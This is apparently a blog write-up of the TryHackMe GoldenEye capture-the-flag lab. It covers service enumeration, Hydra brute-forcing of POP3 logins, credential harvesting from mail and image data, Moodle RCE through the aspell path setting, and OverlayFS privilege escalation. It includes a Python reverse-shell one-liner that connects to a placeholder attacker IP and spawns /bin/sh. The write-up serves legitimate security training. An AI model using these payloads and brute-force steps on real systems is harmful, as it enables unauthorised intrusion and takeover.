---
title: TryHackMe - GoldenEye
author: r2cook
categories:
  - TryHackMe
tags:
  - goldeneye
  - vhost
  - pop3
  - hydra
  - password-bruteforce
  - moodle
  - reverse-shell
  - RCE
  - PrivEsc
  - kernel-exploit
  - overlayfs
render_with_liquid: false
media_subpath: /images/thm/GoldenEye/
image:
  path: room_card.png
---


> In this walkthrough, we compromise the TryHackMe **GoldenEye** machine by enumerating the exposed web portal, extracting hidden credentials from client-side JavaScript, abusing the POP3 mail service to gather internal intelligence, pivoting through multiple user accounts, gaining administrator access to the Moodle portal, achieving remote code execution through the **aspell path injection vulnerability**, and finally escalating privileges to **root** using a vulnerable **OverlayFS kernel exploit**.

---

## Initial Setup

First, add the target to your hosts file:

```plaintext
10.113.149.214 goldeneye.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

We begin with a full TCP scan using RustScan, followed by targeted service enumeration with Nmap.

```shell
$ rustscan -a goldeneye.thm -g
10.113.149.214 -> [25,80,55006,55007]

$ nmap -sC -sV -p 25,80,55006,55007 -Pn -T4 -oA nmap/scan goldeneye.thm
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-12 22:32 +0200
Nmap scan report for goldeneye.thm (10.113.149.214)
Host is up (0.064s latency).

PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_pop3-capabilities: TOP USER SASL(PLAIN) PIPELINING CAPA AUTH-RESP-CODE STLS UIDL RESP-CODES

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.95 seconds
```
{: .nolineno }

Interesting services exposed:

- **HTTP (80)**
    
- **SMTP (25)**
    
- **POP3 (55006 / 55007)**

---

##  Web Portal Enumeration (Port 80)

Browsing the web portal reveals a message instructing us to navigate to `/sev-home/`.

![](web_portal_enum_80.png){: width="800" height="400" .shadow }

After visiting the page:

![](web_portal_80_sev_home.png){: width="800" height="400" .shadow }

Default credentials do not work, so the next step is to inspect the page source.

![](web_portal_80_page_source.png){: width="800" height="400" .shadow }

A JavaScript file named `terminal.js` stands out, so we inspect it.

![](web_portal_80_terminal_js.png){: width="800" height="400" .shadow }

```text
//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//
```

The password appears to be **HTML entity encoded**.

After decoding:

![](decode_identifier.png){: width="800" height="400" .shadow }

![](decode_html.png){: width="800" height="400" .shadow }

We recover Boris’s password.

Now we can log in successfully to `/sev-home/`.

![](web_portal_80_sev_home_login_success.png){: width="800" height="400" .shadow }

Inside, we find an important clue:

```text
GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO)

Please email a qualified GNO supervisor to receive the online **GoldenEye Operators Training** to become an Administrator of the GoldenEye system

Remember, since **_security by obscurity_** is very effective, we have configured our pop3 service to run on a very high non-default port
```

This strongly points us toward the POP3 service.

---

##  POP3 Enumeration

POP3 (**Post Office Protocol v3**) is a mail retrieval protocol commonly used to download emails from a remote mail server.

The authentication flow is simple:

- `USER <username>` → specify mailbox
    
- `PASS <password>` → authenticate
    
- `LIST` → list available emails
    
- `RETR <id>` → retrieve a specific email
    
- `QUIT` → close session
    

We connect manually using OpenSSL because the service supports **STARTTLS**.

```shell
$ openssl s_client -connect goldeneye.thm:55007 -starttls pop3
```
{: .nolineno }

The credentials used on the web portal do **not** work for POP3.

![](pop3_bories_login_falied.png){: width="800" height="400" .shadow }

From `terminal.js`, we already know two usernames:

- `Boris`
    
- `Natalya`

So we build a user list and brute-force with Hydra.

```shell
$ hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt pop3://goldeneye.thm:55007 
...
[55007][pop3] host: goldeneye.thm   login: boris   password: secret1!
[55007][pop3] host: goldeneye.thm   login: natalya   password: bird
...
```
{: .nolineno }

> **Note:** `rockyou.txt` was too large and caused unstable brute-force behavior against this POP3 service. After testing, `fasttrack.txt` worked much better.

---

## Reading Boris's Mailbox

Now we authenticate as Boris.

![](pop3_bories_login_and_list_retr_1.png){: width="800" height="400" .shadow }

```shell
USER boires
PASS secret1!
```
{: .nolineno }

List available emails:

```shell
LIST
```
{: .nolineno }

Retrieve specific messages:

```shell
RETR 2
RETR 3
```
{: .nolineno }

![](pop3_bories_retr_2_3.png){: width="800" height="400" .shadow }

Boris's mailbox does not reveal anything highly useful, so we pivot to Natalya.

---

## Reading Natalya's Mailbox

`RETR 1` contains nothing useful, but `RETR 2` exposes credentials.

![](pop3_natalya_retr_2.png){: width="800" height="400" .shadow }

```text
username: xenia
password: RCP90rulez!
```

Excellent.

Now add the second domain to `/etc/hosts`:

```plaintext
10.113.149.214 goldeneye.thm severnaya-station.com
```
{: file="/etc/hosts" }

Navigate to:

```url
http://severnaya-station.com/gnocertdir
```

![](severnaya_station_enum.png){: width="800" height="400" .shadow }

Log in with the exposed credentials.

![](severnaya_station_login.png){: width="800" height="400" .shadow }

![](severnaya_station_loged_in.png){: width="800" height="400" .shadow }

---

##  Internal Message Pivoting

While exploring the portal, the **Messages** section contains a conversation involving **Doak**.

![](severnaya_station_messages.png){: width="800" height="400" .shadow }

![](severnaya_station_messages_full_conversation.png){: width="800" height="400" .shadow }

This suggests another POP3 account may exist.

We brute-force again:

```shell
$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://goldeneye.thm:55007
...
[55007][pop3] host: goldeneye.thm   login: doak   password: goat
...
```
{: .nolineno }

Success.

---

##  Reading Doak's Mailbox

Authenticate via POP3 using Doak’s credentials.

![](pop3_doak_login_and_list_retr_1.png){: width="800" height="400" .shadow }

The only message contains **portal credentials**.

```text
username: dr_doak
password: 4England!
```

After logging into the web panel with these credentials, we discover a **Private Files** section.

Inside, we find `s3cret.txt`.

![](severnaya_station_dr_doak_files.png){: width="800" height="400" .shadow }

```shell
$ cat s3cret.txt 
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.  
```
{: .nolineno }

This gives us another lead.

---

##  Hidden Credentials in Image Metadata

Navigate to:

```url
http://severnaya-station.com/dir007key/for-007.jpg
```

![](severnaya_station_dir007key_for007_jpg.png){: width="800" height="400" .shadow }

Download the image and inspect it with `strings`.

```shell
$ strings for-007.jpg | less
...
eFdpbnRlcjE5OTV4IQ==
...
$ echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
xWinter1995x! 
```
{: .nolineno }

We recover the password:

```text
xWinter1995x!
```

From the room hint, the username is likely `admin`.

The login works successfully.

---

##  Moodle RCE via Aspell Path Injection

The hint says that this user can edit Moodle settings.

Searching for **aspell** in the admin panel reveals the spell-check binary path configuration.

![](severnaya_station_searching_for_aspel.png){: width="800" height="400" .shadow }

We can replace it with a Python reverse shell.

> Replace `IP` with your attacker machine IP.

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1IP",9001));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

Start a Netcat listener.

![](open_nc_listener_9001.png){: width="800" height="400" .shadow }

Replace the **Path to aspell** value with the reverse shell payload and save.

![](severnaya_station_add_our_code_to_aspell_path.png){: width="800" height="400" .shadow }

Now navigate to **Site Blog → Add a new entry**.

![](severnaya_station_site_blog_new_entry.png){: width="800" height="400" .shadow }

Click the **spell-check** button in the editor.

![](severnaya_station_add_new_entry.png){: width="800" height="400" .shadow }

Once clicked, check the Netcat listener.

![](reverse_shell_obtained.png){: width="800" height="400" .shadow }

Success — we now have a shell as `www-data`.

---

## Privilege Escalation — OverlayFS

Check the kernel version:

![](uname_r.png){: width="800" height="400" .shadow }

The kernel version is vulnerable to the **OverlayFS local privilege escalation exploit**.

I used the public Exploit-DB PoC in C, but the original code had compilation issues.

After troubleshooting, the fix was to replace `gcc`  inside the source with `cc`.

![](c_code_fix.png){: width="800" height="400" .shadow }

Upload `ofs.c` to the victim machine and compile it:

```shell
cc ofs.c -o ofs
```
{: .nolineno }

Run the exploit:

```shell
./ofs
```
{: .nolineno }

Root shell obtained.

![](root_shell_obtained.png){: width="800" height="400" .shadow }

---

##  Root Flag

The final flag is located at:

```shell
/root/.flag.txt
```
{: .nolineno }

![](cat_flag_txt.png){: width="800" height="400" .shadow }

![](006_final_xvf7_flag.png){: width="800" height="400" .shadow }

---